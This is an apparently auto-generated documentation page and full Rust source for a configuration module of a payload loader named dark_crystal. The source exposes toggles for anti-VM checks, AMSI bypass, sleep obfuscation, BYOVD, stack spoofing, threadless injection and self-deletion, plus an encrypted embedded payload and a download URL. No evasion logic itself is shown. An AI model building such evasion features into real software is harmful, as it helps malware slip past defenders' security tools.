# selection_config

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/selection_config.rs` |
| **Lines** | 201 |
| **Cards** | T021-patterns |
| **Role** | OnceLock config from include_str! YAML |
| **Feature gates** | embed_payload |

## Types

### struct `SelectionLock` (line 10)

### struct `SelectionMeta` (line 20)

### struct `RuntimeFlags` (line 25)

### struct `PayloadConfig` (line 43)

### struct `EntropyConfig` (line 53)

### struct `LoggingConfig` (line 59)

### struct `RoutingConfig` (line 64)

## Public API

### `current` (line 75)
```rust
pub fn current() -> &'static SelectionLock
```

### `embedded_payload` (line 83)
```rust
pub fn embedded_payload() -> &'static [u8]
```

### `selected_profile` (line 87)
```rust
pub fn selected_profile() -> &'static str
```

### `log_level` (line 91)
```rust
pub fn log_level() -> &'static str
```

### `verbose_debug` (line 95)
```rust
pub fn verbose_debug() -> bool
```

### `syscall_mode` (line 99)
```rust
pub fn syscall_mode() -> &'static str
```

### `sleep_profile` (line 103)
```rust
pub fn sleep_profile() -> &'static str
```

### `iat_profile` (line 107)
```rust
pub fn iat_profile() -> usize
```

### `syscall_seed` (line 111)
```rust
pub fn syscall_seed() -> u32
```

### `syscall_pepper` (line 115)
```rust
pub fn syscall_pepper() -> u32
```

### `aes_key_raw` (line 119)
```rust
pub fn aes_key_raw() -> &'static [u8]
```

### `aes_iv_raw` (line 123)
```rust
pub fn aes_iv_raw() -> &'static [u8]
```

### `target_url` (line 127)
```rust
pub fn target_url() -> &'static str
```

### `is_pe_payload` (line 131)
```rust
pub fn is_pe_payload() -> bool
```

### `mock_shellcode` (line 135)
```rust
pub fn mock_shellcode() -> bool
```

### `enable_anti_vm` (line 139)
```rust
pub fn enable_anti_vm() -> bool
```

### `enable_api_hammering` (line 143)
```rust
pub fn enable_api_hammering() -> bool
```

### `enable_iat_camouflage` (line 147)
```rust
pub fn enable_iat_camouflage() -> bool
```

### `enable_self_delete` (line 151)
```rust
pub fn enable_self_delete() -> bool
```

### `enable_amsi_hbp` (line 155)
```rust
pub fn enable_amsi_hbp() -> bool
```

### `enable_ekko` (line 159)
```rust
pub fn enable_ekko() -> bool
```

### `enable_byovd` (line 163)
```rust
pub fn enable_byovd() -> bool
```

### `cow_cloak` (line 167)
```rust
pub fn cow_cloak() -> bool
```

### `enable_tier3` (line 171)
```rust
pub fn enable_tier3() -> bool
```

### `enable_stack_spoof` (line 175)
```rust
pub fn enable_stack_spoof() -> bool
```

### `enable_module_overload` (line 179)
```rust
pub fn enable_module_overload() -> bool
```

### `enable_threadless` (line 183)
```rust
pub fn enable_threadless() -> bool
```

### `enable_process_reflection` (line 187)
```rust
pub fn enable_process_reflection() -> bool
```

### `overload_target_dll` (line 191)
```rust
pub fn overload_target_dll() -> &'static str
```

### `threadless_target_export` (line 195)
```rust
pub fn threadless_target_export() -> &'static str
```

### `spoof_modules` (line 199)
```rust
pub fn spoof_modules() -> &'static [String]
```

## Key Dependencies

- `use serde::Deserialize;`

## Full Source

```rust
use serde::Deserialize;
use std::sync::OnceLock;

const SELECTION_LOCK_JSON: &str = include_str!(concat!(
    env!("CARGO_MANIFEST_DIR"),
    "/../../framework/generated/selection.lock.yaml"
));

#[derive(Debug, Deserialize)]
pub struct SelectionLock {
    pub selection: SelectionMeta,
    pub runtime: RuntimeFlags,
    pub payload: PayloadConfig,
    pub entropy: EntropyConfig,
    pub logging: LoggingConfig,
    pub routing: RoutingConfig,
}

#[derive(Debug, Deserialize)]
pub struct SelectionMeta {
    pub profile: String,
}

#[derive(Debug, Deserialize)]
pub struct RuntimeFlags {
    pub anti_vm: bool,
    pub hammering: bool,
    pub iat_camou: bool,
    pub self_delete: bool,
    pub amsi_hbp: bool,
    pub ekko: bool,
    pub verbose_debug: bool,
    pub byovd: bool,
    pub cow_cloak: bool,
    pub enable_tier3: bool,
    pub advanced_stack: bool,
    pub module_overload: bool,
    pub threadless: bool,
    pub process_reflection: bool,
}

#[derive(Debug, Deserialize)]
pub struct PayloadConfig {
    pub mode: String,
    pub is_pe: bool,
    pub mock_shellcode: bool,
    pub url: String,
    pub aes_key_raw: Vec<u8>,
    pub aes_iv_raw: Vec<u8>,
}

#[derive(Debug, Deserialize)]
pub struct EntropyConfig {
    pub syscall_seed: u32,
    pub syscall_pepper: u32,
}

#[derive(Debug, Deserialize)]
pub struct LoggingConfig {
    pub level: String,
}

#[derive(Debug, Deserialize)]
pub struct RoutingConfig {
    pub syscall_mode: String,
    pub sleep_profile: String,
    pub iat_profile: usize,
    pub spoof_modules: Vec<String>,
    pub overload_target_dll: String,
    pub threadless_target_export: String,
}

static CONFIG: OnceLock<SelectionLock> = OnceLock::new();

pub fn current() -> &'static SelectionLock {
    CONFIG.get_or_init(|| {
        serde_json::from_str(SELECTION_LOCK_JSON)
            .expect("framework/generated/selection.lock.yaml must be valid JSON-compatible content")
    })
}

#[cfg(feature = "embed_payload")]
pub fn embedded_payload() -> &'static [u8] {
    include_bytes!("payload.enc")
}

pub fn selected_profile() -> &'static str {
    current().selection.profile.as_str()
}

pub fn log_level() -> &'static str {
    current().logging.level.as_str()
}

pub fn verbose_debug() -> bool {
    current().runtime.verbose_debug
}

pub fn syscall_mode() -> &'static str {
    current().routing.syscall_mode.as_str()
}

pub fn sleep_profile() -> &'static str {
    current().routing.sleep_profile.as_str()
}

pub fn iat_profile() -> usize {
    current().routing.iat_profile
}

pub fn syscall_seed() -> u32 {
    current().entropy.syscall_seed
}

pub fn syscall_pepper() -> u32 {
    current().entropy.syscall_pepper
}

pub fn aes_key_raw() -> &'static [u8] {
    current().payload.aes_key_raw.as_slice()
}

pub fn aes_iv_raw() -> &'static [u8] {
    current().payload.aes_iv_raw.as_slice()
}

pub fn target_url() -> &'static str {
    current().payload.url.as_str()
}

pub fn is_pe_payload() -> bool {
    current().payload.is_pe
}

pub fn mock_shellcode() -> bool {
    current().payload.mock_shellcode
}

pub fn enable_anti_vm() -> bool {
    current().runtime.anti_vm
}

pub fn enable_api_hammering() -> bool {
    current().runtime.hammering
}

pub fn enable_iat_camouflage() -> bool {
    current().runtime.iat_camou
}

pub fn enable_self_delete() -> bool {
    current().runtime.self_delete
}

pub fn enable_amsi_hbp() -> bool {
    current().runtime.amsi_hbp
}

pub fn enable_ekko() -> bool {
    current().runtime.ekko
}

pub fn enable_byovd() -> bool {
    current().runtime.byovd
}

pub fn cow_cloak() -> bool {
    current().runtime.cow_cloak
}

pub fn enable_tier3() -> bool {
    current().runtime.enable_tier3
}

pub fn enable_stack_spoof() -> bool {
    current().runtime.advanced_stack
}

pub fn enable_module_overload() -> bool {
    current().runtime.module_overload
}

pub fn enable_threadless() -> bool {
    current().runtime.threadless
}

pub fn enable_process_reflection() -> bool {
    current().runtime.process_reflection
}

pub fn overload_target_dll() -> &'static str {
    current().routing.overload_target_dll.as_str()
}

pub fn threadless_target_export() -> &'static str {
    current().routing.threadless_target_export.as_str()
}

pub fn spoof_modules() -> &'static [String] {
    current().routing.spoof_modules.as_slice()
}

```